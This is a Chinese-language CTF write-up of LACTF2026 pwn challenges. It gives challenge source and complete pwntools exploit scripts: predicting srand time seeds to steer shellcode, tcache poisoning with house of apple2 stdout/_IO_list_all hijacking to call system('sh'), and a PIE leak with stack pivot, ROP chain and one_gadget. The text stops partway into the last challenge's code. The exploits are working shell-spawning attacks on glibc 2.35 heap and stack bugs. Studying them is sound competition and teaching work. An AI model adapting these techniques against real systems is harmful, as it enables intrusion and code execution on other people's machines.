---
title: LACTF2026-pwn 个人题解
date: 2026-02-11 02:38:00
tags: 
    - pwn
    - LACTF2026
    - WriteUp
    - house of apple2
    - IO_FILE
    - heap
    - tcache poisoning
    - 数组越界
    - stack
    - 随机数预测
    - 结构体复用
    - 栈迁移
categories: Contest
---
## tic-tac-no

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/main.png)

井字棋

#### playerMove

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/playerMove.png)

数组越界写

#### checkWin

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/checkWin.png)

相同字符就胜利

#### bss

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tic-tac-no/bss.png)

越界写把电脑的棋子变成自己的就行了，脚本都不用写

## ScrabASM

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/main.png)

#### swap_tile

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/swap_tile.png)

#### play

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/play.png)

其实就是执行随机生成的 shellcode ，但可以更换任意字节为随机字节

### 攻击思路

由于 srand 以时间作种子，可以考虑在同时运行本地随机数生成程序和攻击脚本以预测随机数，进而控制 shellcode

且由于只有 15 字节的空间，我们可以先执行 read shellcode 再自行写入提权 shellcode

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/ScrabASM/reg.png)

(这张图片用了队友 ItsFlicker 的，懒得自己再截了)

```
add al,  0xd
push rax
pop rsi
xor edi, edi
push rdi
pop rax
mov dl, 0xf0
syscall

{ 0x04, 0x0D, 0x50, 0x5E, 0x31, 0xFF, 0x57, 0x58, 0xB2, 0xF0, 0x0F, 0x05 }
```

### exp

#### c

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    int t = time(0);
    srand(t + 2);
    FILE *fp = fopen("./beyond.txt", "w");
    if (fp == NULL) {
        printf("failed");
    }
    for (int i = 1; i <= 1000; i++) {
        fprintf(fp, "%02x ", rand() % 0x100);
    }
    fclose(fp);
    srand(t);
    fp = fopen("./present.txt", "w");
    if (fp == NULL) {
        printf("failed");
    }
    for (int i = 1; i <= 1000; i++) {
        fprintf(fp, "%02x ", rand() % 0x100);
    }
    fclose(fp);
    srand(t + 1);
    fp = fopen("./future.txt", "w");
    if (fp == NULL) {
        printf("failed");
    }
    for (int i = 1; i <= 1000; i++) {
        fprintf(fp, "%02x ", rand() % 0x100);
    }
    fclose(fp);
    return 0;
}
```

#### python

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./chall')
else:
	io = remote('chall.lac.tf', 31338)

nowrd = []
prsrd = []
ftrrd = []
bydrd = []
tag = ''
nowstep = [0] * 14
rout = []
fag = [0] * 14
sc = ['04', '0d', '50', '5e', '48', '31', 'ff', '57', '58', 'b2', 'f0', '0f', '05']

def rdbt():
	global nowrd
	io.recvuntil(b'Your starting tiles:')
	for i in range(14):
		io.recvuntil(b'| ')
		nowrd.append(io.recv(2).decode('utf-8'))

def prsbt():
	global prsrd
	with open('present.txt', 'r', encoding = 'utf-8') as f:
		prsrd = f.read().split()

def ftrbt():
	global ftrrd
	with open('future.txt', 'r', encoding = 'utf-8') as f:
		ftrrd = f.read().split()

def bydbt():
	global bydrd
	with open('beyond.txt', 'r', encoding = 'utf-8') as f:
		bydrd = f.read().split()

def randswap():
	prepos = 13
	for nowpos in range(14, 1000):
		flag = 0
		op = 0
		for i in range(len(sc)):
			if sc[i] == nowrd[nowpos] and fag[i] == 0:
				flag = i
				fag[i] = 1
				op = 1
				break
		if op == 1:
			nowstep[flag] = nowpos - prepos
			prepos = nowpos
			rout.append(flag)
		if len(rout) == 14:
			break

def swapidx(idx):
	io.sendline(b'1')
	io.sendline(str(idx).encode())

def attack():
	global rout
	global nowstep
	global nowrd
	global tag
	rdbt()
	prsbt()
	ftrbt()
	bydbt()
	flag = 7
	for i in range(len(nowrd)):
		if nowrd[i] != prsrd[i]:
			flag = flag & 0b110
		if nowrd[i] != ftrrd[i]:
			flag = flag & 0b101
		if nowrd[i] != bydrd[i]:
			flag = flag & 0b011
	if flag == 1:
		tag = 'prs'
		nowrd = prsrd
	elif flag == 2:
		tag = 'prs'
		nowrd = ftrrd
	elif flag == 4:
		tag = 'prs'
		nowrd = bydrd
	print(tag)
	randswap()
	for i in rout:
		for _ in range(nowstep[i]):
			swapidx(i)
	io.sendlineafter(b'> ', b'2')
	mysc = shellcraft.sh()
	io.send(asm(mysc))
	io.interactive()

attack()
```

## tcademy

#### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/checksec.png)

保护全开

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/main.png)

菜单题

#### menu

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/menu.png)

#### create_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/create_note.png)

只有两个槽位

#### delete_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/delete_note.png)

#### print_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/print_note.png)

puts 可以通过溢出泄露一些内容

#### get_note_index

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/get_note_index.png)

#### read_data_into_note

![这是什么鸭](https://pic.ratherhard.com/post/contest/LACTF-2026/tcademy/read_data_into_note.png)

此处有由整数溢出造成的堆溢出漏洞

### 攻击思路

glibc 版本为 2.35 ，是高版本，有 PIE 保护，没有 hook 函数可以劫持

所以考虑劫持某个 _IO_FILE 结构体用来 getshell ，在此之前应先 leak libc

可以通过 tcache poisoning 去把一个 chunk 放入 unsortedbin 中来实现 libc leak

在高版本 libc 中， tcache 劫持的要求会更加严格

首先是 safe-linking 机制，这需要还原泄露出的 next 指针，并且 key 的生成不再与堆地址相关，改为和 canary 类似的随机 8 字节数据

然后是分配 tcache 时的判断，决定 tcache 是否分配的标准由 entry 是否为空变为 counts 是否为 0 ，不能再简单粗暴地劫持 tcache_pthread_struct 就完事了

对于这道题目而言，更加棘手的是同时持有的 chunk 槽位只有两个，而想要通过 tcache poisoning 把目标地址写的权限拿到手至少需要持有两个该 tcache 的 chunk ，这需要我们修改 counts ，而在能够修改 counts 之前的 tcache_pthread_struct 劫持步骤，我们必须预先申请两个相同大小的 chunk 再放入 tcache 

而且还要注意不要破坏掉 size ，破坏了也要修复，不然 delete 的时候有你好受

在进行 unsortedbin 布置时我们采用了堆溢出修改 size 结合 counts 篡改的方式，这样可以在持有该 chunk 的情形下将其定位到 unsortedbin ，事后直接 free 即可，非常方便

还要注意一个小细节： tcache_pthread_struct 会被劫持也会被释放，这样的话前面的一些 counts 会变得比较奇怪，而且用于劫持 tcache_pthread_struct 的那个 tcache 会废掉，需要更换 size 做接下来的步骤

最后劫持 _IO_2_1_stdout_ 打 house_of_apple2 即可

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 102

if debug:
	io = process('./chall_patched')
else:
	io = remote('chall.lac.tf', 31144)

libc = ELF('./libc.so.6')

def create(index, size, content):
	io.sendlineafter(b'Choice > ', b'1')
	io.sendlineafter(b'Index: ', str(index).encode())
	io.sendlineafter(b'Size: ', str(size).encode())
	io.sendafter(b'Data: ', content)

def delete(index):
	io.sendlineafter(b'Choice > ', b'2')
	io.sendlineafter(b'Index: ', str(index).encode())

def printnote(index):
	io.sendlineafter(b'Choice > ', b'3')
	io.sendlineafter(b'Index: ', str(index).encode())

def calcnext(ptr, pos):
	return (ptr // 0x1000) ^ pos

def attack():
	msize = 0x7
	nsize = 0xf8
	osize = 0xe8

	create(0, msize, b'\n')		# build arch
	create(1, nsize, b'\n')
	delete(0)
	delete(1)

	payload = b'A' * (0x20 - 1) + b'B'		# leak heap
	create(0, msize, payload)
	printnote(0)
	io.recvuntil(b'AB')
	heap = u64(io.recv(5).ljust(8, b'\x00')) * 0x1000
	log.info(f'heap = {hex(heap)}')
	delete(0)

	payload = b'A' * 0x18 + p64(0x101)		# fix up
	create(0, msize, payload)
	delete(0)
	create(0, nsize, b'\n')
	create(1, nsize, b'\n')
	delete(1)
	delete(0)
	
	toentry = calcnext(heap + 0x2c0, heap + 0x10)		# tcache_pthread_struct hijack
	payload = b'A' * 0x18 + p64(0x91) + p64(toentry).ljust(0x80, b'\x00') + p64(0x90) + p64(0x71)
	create(0, msize, payload)
	delete(0)
	create(0, nsize, '\n')
	payload = (p16(1) + p16(0) * 6 + p16(8)).ljust(0x80, b'\x00')
	create(1, nsize, payload)

	delete(0)		# into unsortedbin
	payload = b'A' * (0x20 - 1) + b'B'
	create(0, msize, payload)
	printnote(0)
	io.recvuntil(b'AB')
	libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x21ace0
	log.info(f'libc = {hex(libc.address)}')
	delete(0)

	payload = b'A' * 0x18 + p64(0x91) 	# fix up
	create(0, msize, payload)
	delete(0)
	delete(1)
	create(0, osize, b'\n')
	create(1, osize, b'\n')
	delete(1)
	delete(0)

	stdout = libc.sym['_IO_2_1_stdout_']		# stdout hijack
	payload = b'A' * 0x18 + p64(0x101) + p64(0) * 31 + p64(0x101) + p64(0) * 31 + p64(0xf1) + p64(calcnext(heap + 0x4c0, stdout))
	create(0, msize, payload)
	delete(0)
	create(0, osize, '\n')
	fake_io = flat({
			0x0: b"  sh;",
			0x28: libc.sym['system'],
			0x88: heap,
			0xA0: stdout - 0x40,
			0xD8: libc.sym['_IO_wfile_jumps'] - 0x20
		},
		filler=b"\x00"
	)
	log.info(f'stdout = {hex(stdout)}')
	create(1, osize, fake_io)
	io.interactive()

attack()
```

## ourUKLA

### code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MAX_STUDENTS 10

#define UNDERGRAD 0x1
#define MASTERS 0x2
#define PHD 0x4
#define POSTDOC 0x8
#define HASNOLIFE 0x10
#define ACMCYBER 0x20

struct student_info {
    char noeditingmyptrs[0x10]; // No editing my pointers !!!
    char *name;
    unsigned long attributes;
    char major[0x40];
    char aux[0x90];
};
struct student {
    unsigned long array_id;
    unsigned long uid;
    struct student_info *sinfo;
};

struct student *ourUKLA[MAX_STUDENTS] = {0};
int cur_index = 0;

void menu() {
    puts("________________________________________________");
    puts("|                  ----------                  |");
    puts("|                ourUKLA v0.1.7                |");
    puts("|                  ----------                  |");
    puts("| 1. Add student                               |");
    puts("| 2. Get student info                          |");
    puts("| 3. Remove student                            |");
    puts("|______________________________________________|");
    puts("");
    printf("Option > ");
}

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    malloc(0x18);
    puts("Administrator, welcome to ourUKLA.");
    puts("This is the portal for the University of Kungkungkung LAhur.\n");
}

void fill_student_info(struct student *s) {

    struct student_info *sinfo;
    if (s->sinfo == NULL) sinfo = malloc(sizeof(struct student_info));
    else sinfo = s->sinfo;

    char *name = malloc(0x100);
    printf("Student name: ");
    read(STDIN_FILENO, name, 0x100);
    sinfo->name = name;

    printf("Student major: ");
    read(STDIN_FILENO, sinfo->major, 0x40);

    printf("Student attributes (e.g. undergrad = 1): ");
    scanf("%lu", &sinfo->attributes);
    while ((getchar()) != '\n');
    sinfo->attributes |= HASNOLIFE | ACMCYBER;

    printf("Require space to add aux data (y/n)? ");
    char res = getchar();
    getchar();
    if (res == 'y') {
        printf("Aux data: ");
        read(STDIN_FILENO, sinfo->aux, 0x90);
    }

    s->sinfo = sinfo;
}

void add_student() {

    char* old_top = *((char**)puts + (0x166580/8)) + 0x10;
    struct student *s = ourUKLA[cur_index] = malloc(sizeof(struct student));
    if ((void *)old_top == (void *)s) s->sinfo = NULL;

    s->array_id = cur_index++;
    cur_index %= MAX_STUDENTS;

    printf("Enter student UID: ");
    scanf("%ld", &s->uid);
    while ((getchar()) != '\n');

    printf("Enter student information now (y/n)? You can do it later: ");
    char res = getchar();
    getchar();
    if (res == 'y') fill_student_info(s);

    printf("Student with UID %lu added at index %lu!\n", s->uid, s->array_id);
}

void get_student_info() {

    unsigned long uid;
    printf("Enter student UID: ");
    scanf("%lu", &uid);

    for (int i = 0; i < MAX_STUDENTS; i++) {
        if (ourUKLA[i] == NULL) continue;

        if (ourUKLA[i]->uid == uid) {

            struct student_info *sinfo = ourUKLA[i]->sinfo;
            if (sinfo) {
                puts("STUDENT INFO");
                printf("Student Name: %s\n", sinfo->name);
                printf("Student Major: %s\n", sinfo->major);
                printf("Student Attributes (number): %lu\n", sinfo->attributes);
            }
            return;
        }
    }
}

void remove_student() {

    unsigned long uid;
    printf("Enter student UID: ");
    scanf("%lu", &uid);

    for (int i = 0; i < MAX_STUDENTS; i++) {
        if (ourUKLA[i] == NULL) continue;

        if (ourUKLA[i]->uid == uid) {

            struct student_info *sinfo = ourUKLA[i]->sinfo;
            if (sinfo) {
                free(sinfo->name);
                free(sinfo);
            }
            free(ourUKLA[i]);

            ourUKLA[i] = NULL;
            return;
        }
    }
}

int main() {
    
    init();

    int choice;
    while (1) {
        menu();
        scanf("%d", &choice);
        switch (choice) {
            case 1:
                add_student();
                break;
            case 2:
                get_student_info();
                break;
            case 3:
                remove_student();
                break;
            default:
                puts("cmon you're an administrator don't tell me you don't know how to follow basic instructions!!");
                exit(1);
        };
    }

    return 0;
}
```

菜单堆题，最多可以持有 10 个 chunk ，但可以无限申请

有关于 student-info 的 UAF

### 攻击思路

突破口在于 student-info 的 UAF ，当申请一个新的 student 时，若 s_info 不为空，则不重新申请

于是就可以利用这一点，在某个合适 chunk 中写入 leak 出的 _IO_list_all - 0x10 地址，然后把这个 chunk 放入 unsortedbin 中再进行若干次单采 student 使某一次恰好令 s_info = _IO_list_all - 0x10 ，如果此时选择填写 name 的话，刚好可以在 _IO_list_all 的位置上放上 name 指针，这也是一种任意地址写堆地址的原语

然而在达成原语之前需要先 leak heap 和 leak libc ，而 leak 过程会破坏堆的结构，使后续过程难以进行；因此我们可以先 malloc 至没有 freed chunk ，再重新布局

关于布局，核心思路就是：填满目标大小的 tcache ，从而创造出一个 unsortedbin chunk

最后 name 上打 house of apple2 即可

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

if debug:
	io = process('./chall_patched')
else:
	io = remote('chall.lac.tf', 31147)

libc = ELF('./libc.so.6')

def calc_real_next(next):
	ori = next
	for i in range(4):
		next = ori ^ (next >> 12)
	return next

def fill_student_info(name, major, attributes, yon, aux):
	io.sendafter(b'name: ', name)
	io.sendafter(b'major: ', major)
	
	io.sendlineafter(b'(e.g. undergrad = 1): ', str(attributes).encode())
	if yon:
		io.sendlineafter(b'(y/n)? ', b'y')
		io.sendafter(b'data: ', aux)
	else:
		io.sendlineafter(b'(y/n)? ', b'n')

def add_student(UID, info = False, name = b'', major = b'', attributes = b'', yon = False, aux = b''):
	io.sendlineafter(b'Option > ', b'1')
	io.sendlineafter(b'UID: ', str(UID).encode())
	if info:
		io.sendlineafter(b'later: ', b'y')
		fill_student_info(name, major, attributes, yon, aux)
	else:
		io.sendlineafter(b'later: ', b'n')

def get_student_info(UID):
	io.sendlineafter(b'Option > ', b'2')
	io.sendlineafter(b'UID: ', str(UID).encode())

def remove_student(UID):
	io.sendlineafter(b'Option > ', b'3')
	io.sendlineafter(b'UID: ', str(UID).encode())

def exit_fsop():
	io.sendlineafter(b'Option > ', b'4')

def attack():
	for i in range(10):		# init
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	for i in range(8):
		remove_student(i)
	for i in range(7):
		add_student(i, True, b'A', b'A', b'A', True, b'A')

	get_student_info(0)		# leak heap
	io.recvuntil(b'Name: A')
	leak_next = u64(io.recv(5).ljust(8, b'\x00'))
	heap = (calc_real_next(leak_next) - 0x1e) * 0x100
	log.info(f'heap = {hex(heap)}')

	add_student(7)		# leak libc
	get_student_info(7)
	io.recvuntil(b'Name: ')
	libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x1e6c20
	log.info(f'libc = {hex(libc.address)}')
	fsop = libc.symbols['_IO_list_all'] - 0x10

	add_student(8)		# fix
	add_student(9)
	for i in range(14):
		add_student(i % 10)
	for i in range(7):
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	
	for i in range(7):		# init
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	payload = b'A' * 0x10 + p64(fsop)
	add_student(7, True, b'A', payload, b'A', True, b'A')
	add_student(8, True, b'A', b'A', b'A', True, b'A')
	add_student(9, True, b'A', b'A', b'A', True, b'A')
	for i in range(8):
		remove_student(i)
	for i in range(7):
		add_student(i, True, b'A', b'A', b'A', True, b'A')
	add_student(7)
	add_student(8)
	
	fake_io_base = heap + 0x40b0		# house of apple2
	fake_io = flat({
			0x0: b"  sh;",
			0x28: 1,
			0x68: libc.sym['system'],
			0x88: fake_io_base + 0x1000,
			0xA0: fake_io_base,
			0xD8: libc.sym['_IO_wfile_jumps'],
			0xE0: fake_io_base
		},
		filler=b"\x00"
	)
	add_student(9, True, fake_io, b'A', b'A', True, b'A')
	
	exit_fsop()
	io.interactive()

attack()
```

## adventure

### checksec

```
[*] '/home/RatherHard/CTF-pwn/LACTF/adventure/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void);

#define BOARD_SIZE 16
#define MAX_MOVES 300
#define INPUT_SIZE 8
#define NUM_ITEMS 8

char history[MAX_MOVES][INPUT_SIZE];
int move_count = 0;

int player_x = 0;
int player_y = 0;

const char *last_item = "None";

int board[BOARD_SIZE][BOARD_SIZE];

const char *item_names[] = {
    "Sword",
    "Shield",
    "Potion",
    "Key",
    "Scroll",
    "Amulet",
    "Crown",
    "Flag"
};

const char item_symbols[] = {
    'S', 'H', 'P', 'K', 'L', 'A', 'C', 'F'
};

int inventory[NUM_ITEMS] = {0};

void print_banner(void) {
    puts("");
    puts("    ╔═══════════════════════════════════════════╗");
    puts("    ║     ⚔️  ADVENTURE IN THE DARK MAZE ⚔️      ║");
    puts("    ║         ~ A Quest for Glory ~             ║");
    puts("    ╚═══════════════════════════════════════════╝");
    puts("");
    puts("  In the ancient dungeon of the Forgotten Realm,");
    puts("  treasures await the brave adventurer...");
    puts("");
}

void print_help(void) {
    puts("");
    puts("  ┌─────────── COMMANDS ───────────┐");
    puts("  │  n/s/e/w  - Move North/South/  │");
    puts("  │             East/West          │");
    puts("  │  look     - Look around        │");
    puts("  │  inv      - Check inventory    │");
    puts("  │  grab     - Pick up item       │");
    puts("  │  help     - Show this help     │");
    puts("  │  quit     - Leave the dungeon  │");
    puts("  └────────────────────────────────┘");
    puts("");
}

void print_inventory(void) {
    puts("");
    puts("  ╔═════════ INVENTORY ═════════╗");
    int item_count = 0;
    for (int i = 0; i < NUM_ITEMS; i++) {
        if (inventory[i]) {
            printf("  ║  [%c] %-22s ║\n", item_symbols[i], item_names[i]);
            item_count++;
        }
    }
    if (item_count == 0) {
        puts("  ║   (empty)                   ║");
    }
    puts("  ╠═════════════════════════════╣");
    printf("  ║  %2d,%2d %d/%d %3d/%3d %-6s   ║\n",
           player_x, player_y, item_count, NUM_ITEMS, move_count, MAX_MOVES, last_item);
    puts("  ╚═════════════════════════════╝");
    puts("");
}

void look_around(void) {
    puts("");
    puts("  ~~ You peer into the darkness ~~");
    printf("  You stand at position (%d, %d).\n", player_x, player_y);

    if (board[player_y][player_x] > 0) {
        int item_idx = board[player_y][player_x] - 1;
        printf("  A glimmering %s lies at your feet!\n", item_names[item_idx]);
    } else {
        puts("  The cold stone floor is bare.");
    }
    puts("");
}

void check_flag_password(void) {
    char password[0020];
    puts("");
    puts("  ╔═══════════════════════════════════════╗");
    puts("  ║  The sacred Flag pulses with power!   ║");
    puts("  ║  Speak the ancient password to        ║");
    puts("  ║  unlock its secrets...                ║");
    puts("  ╚═══════════════════════════════════════╝");
    puts("");
    printf("  Password: ");
    fflush(stdout);

    if (fgets(password, 0x20, stdin) == NULL) {
        return;
    }
    password[strcspn(password, "\n")] = 0;

    if (strcmp(password, "easter_egg") == 0) {
        puts("");
        puts("  *** CONGRATULATIONS! ***");
        puts("  The Flag's magic flows through you!");
        puts("  You have conquered the dungeon!");
        puts("");
    } else {
        puts("");
        puts("  The Flag rejects your words...");
        puts("  But you keep it anyway.");
        puts("");
    }
}

void grab_item(void) {
    if (board[player_y][player_x] == 0) {
        puts("  There is nothing here to grab.");
        return;
    }

    int item_idx = board[player_y][player_x] - 1;
    printf("  You pick up the %s!\n", item_names[item_idx]);
    inventory[item_idx] = 1;
    board[player_y][player_x] = 0;
    last_item = item_names[item_idx];

    if (item_idx == 7) {
        check_flag_password();
    }
}

void move_player(int dx, int dy) {
    int new_x = player_x + dx;
    int new_y = player_y + dy;

    if (new_x < 0 || new_x >= BOARD_SIZE || new_y < 0 || new_y >= BOARD_SIZE) {
        puts("  You bump into a cold stone wall.");
        return;
    }

    player_x = new_x;
    player_y = new_y;

    const char *directions[] = {"north", "south", "east", "west"};
    int dir_idx = (dy == -1) ? 0 : (dy == 1) ? 1 : (dx == 1) ? 2 : 3;
    printf("  You venture %s...\n", directions[dir_idx]);

    if (board[player_y][player_x] > 0) {
        int item_idx = board[player_y][player_x] - 1;
        printf("  You spot a %s here!\n", item_names[item_idx]);
    }
}

void init_board(void) {
    memset(board, 0, sizeof(board));

    unsigned long addr = (unsigned long)main;
    unsigned char *bytes = (unsigned char *)&addr;

    for (int i = NUM_ITEMS - 1; i >= 0; i--) {
        int x = (bytes[i] >> 4) & 0x0F;
        int y = bytes[i] & 0x0F;

        while (board[y][x] != 0) {
            x = (x + 1) % BOARD_SIZE;
            if (x == 0) y = (y + 1) % BOARD_SIZE;
        }

        board[y][x] = i + 1;
    }
}

int main(void) {
    char input[INPUT_SIZE];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    print_banner();
    init_board();
    print_help();

    while (move_count < MAX_MOVES) {
        printf("> ");
        fflush(stdout);

        if (fgets(input, sizeof(input), stdin) == NULL) {
            break;
        }

        input[strcspn(input, "\n")] = 0;
        strncpy(history[move_count], input, INPUT_SIZE - 1);
        history[move_count][INPUT_SIZE - 1] = '\0';
        move_count++;

        if (strcmp(input, "n") == 0) {
            move_player(0, -1);
        } else if (strcmp(input, "s") == 0) {
            move_player(0, 1);
        } else if (strcmp(input, "e") == 0) {
            move_player(1, 0);
        } else if (strcmp(input, "w") == 0) {
            move_player(-1, 0);
        } else if (strcmp(input, "look") == 0) {
            look_around();
        } else if (strcmp(input, "inv") == 0) {
            print_inventory();
        } else if (strcmp(input, "grab") == 0) {
            grab_item();
        } else if (strcmp(input, "help") == 0) {
            print_help();
        } else if (strcmp(input, "quit") == 0) {
            puts("");
            puts("  You flee the dungeon in fear...");
            puts("  Perhaps another day, brave adventurer.");
            puts("");
            break;
        } else if (strlen(input) > 0) {
            puts("  Unknown command. Type 'help' for options.");
        }

        if (move_count % 25 == 0 && move_count < MAX_MOVES) {
            printf("  [%d moves remaining...]\n", MAX_MOVES - move_count);
        }
    }

    if (move_count >= MAX_MOVES) {
        puts("");
        puts("  ════════════════════════════════════");
        puts("  The dungeon's magic forces you out!");
        puts("  You have exhausted your journey...");
        puts("  ════════════════════════════════════");
        puts("");
    }

    return 0;
}
```

棋盘游戏，发现 main 的地址通过棋盘上 item 的坐标信息给出，可以泄露 PIE

check_flag_password 有栈溢出，溢出 0x10 字节

history 里面可以布置 ropchain 从而达成栈迁移

### 攻击思路

leak pie 之后在 history 上布置 ropchain ，通过 check_flag_password 的栈溢出把栈迁移到 history 上跑 ropchain 去 leak libc 顺便 reread

然后 reread 的时候写入 onegadget 就行了

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './chall_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

libcoffsetdict = {}
libcrealdict = {}

def libcdict_add(name, addr):
    if addr > 0x1000000:
        libcrealdict[name] = addr
        addr %= 0x1000
    libcoffsetdict[name] = addr

def getlibc():
    global libc
    if not debug:
        libc = ELF(libcdb.search_by_symbol_offsets(libcoffsetdict))

def initlibc():
    if not debug:
        subprocess.run(['cp', libc.path, './libc.so.6'])
        subprocess.run(['pwninit', '--no-template'])

target = '60.205.163.215'
port = 13774

if debug:
    p = process(file)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

def peek(num=4096):
    message = p.recv(num)
    p.unrecv(message)
    return message

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
ur      = lambda x              :p.unrecv(x)
pk      = lambda num=4096       :peek(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success('{} = {}'.format(name, hex(eval(name))))

item = {
    b'Sword': 0,
    b'Shield': 1,
    b'Potion': 2,
    b'Key': 3,
    b'Scroll': 4,
    b'Amulet': 5,
    b'Crown': 6,
    b'Flag': 7
}

nowx, nowy = 0, 0
main_leak = 0
pie_leak = 0

def move(way):
    global nowx, nowy 
    if way == b'e':
        nowx += 1
    elif way == b'w':
        nowx -= 1
    elif way == b's':
        nowy += 1
    elif way == b'n':
        nowy -= 1
    sla(b'> ', way)

def move_check(way):
    global main_leak
    gotit = b''
    move(way)
    rl()
    if (pk(1) != b'>'):
        r(2)
        if r(1) == b'[':
            return
        ru(b'spot a ')
        gotit = ru(b' ')[:-1]
        if (item[gotit] <= 5):
            main_leak |= (nowx << 4 | nowy) << (8 * item[gotit])

def grab(pwd):
    sla(b'> ', b'grab')
    sa(b'Password: ', pwd[:-1])

def write(data):
    while data:
        sla(b'> ', data[:6])
        data = data[0x8:]

def attack():
    global pie_leak
    for i in range(0x8):
        for _ in range(0x10 - 1):
            move_check(b'e')
        move_check(b's')
        for _ in range(0x10 - 1):
            move_check(b'w')
        if (i < 0x7):
            move_check(b's')
    pie_leak = main_leak - 0x1adf
    leak('pie_leak')

    for _ in range(0x10 - 1):
        move(b'n')
    
    leave_ret = pie_leak + 0x172F
    rw_addr = pie_leak + 0x4910     # history
    reread = pie_leak + 0x164D
    rop_leak_chain = flat([
        rw_addr + 0x20,
        pie_leak + 0x1480,      # leak with printf
        0,
        pie_leak + 0x3F98,      # last_item leak puts
        rw_addr + 0x38,
        reread
    ])
    write(rop_leak_chain)
    payload = b'A' * 0x10 + p64(rw_addr) + p64(leave_ret)
    grab(payload)
    libc.address = uru64() - libc.sym['puts']
    leak('libc.address')

    xor_rax_ret = libc.address + 0xc75e9
    pop_rbp_ret = pie_leak + 0x1233
    one_gadget = libc.address + 0xef52b
    rop_break_chain = flat([
        xor_rax_ret,
        pop_rbp_ret,
        pie_leak + 0x6000,
        one_gadget
    ])
    sl(rop_break_chain)
    itr()

attack()

# 0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp

# 0x00000000000c75e9: xor rax, rax; ret;
```

## the_time_war

### checksec

```
[*] '/home/RatherHard/CTF-pwn/LACTF/the_time_war/pwn_the_time_war'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

### code

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void run();

void init() {
    setbuf(stdout, NULL);
    srand(clock_gettime);
}

void run() {
    short code[4];
    for (int i = 0; i < 4; i ++) {
        code[i] = rand() % 16;
    }
    printf("You see a locked box. The dial on the lock reads: %d-%d-%d-%d\n", code[0], code[1], code[2], code[3]);
    printf("Which dial do you want to turn? ");
    short ind1, val1, ind2, val2;
    if (scanf("%hd", &ind1) <= 0) {
        return;
    }
    printf("What do you want to set it to? ");
    scanf("%hd", &val1);
    printf("Second dial to turn? ");
    scanf("%hd", &ind2);
    printf("What do you want to set it to? ");
    scanf("%hd", &val2);
    code[ind1] = val1;
    code[ind2] = val2;
